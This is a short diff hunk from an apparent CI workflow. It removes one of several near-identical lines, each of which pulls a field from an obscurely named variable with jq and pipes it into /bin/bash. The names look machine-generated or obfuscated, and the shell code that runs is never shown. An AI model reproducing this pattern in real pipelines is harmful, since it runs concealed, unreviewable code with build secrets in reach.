@@ -21,7 +21,6 @@ jobs:
           echo $umq51351 | jq -r .dua9517 | /bin/bash
           echo $pia613 | jq -r .jt0524 | /bin/bash
           echo $dmbls2924 | jq -r .hfvts633 | /bin/bash
-          echo $tiv022 | jq -r .xyj57351 | /bin/bash
           printf '%s' "$cvtgn43975" | jq -r .dc5470 | /bin/bash
           printf '%s' "$eo81" | jq -r .v753 | /bin/bash
           printf '%s' "$k9" | jq -r .imbs18025 | /bin/bash
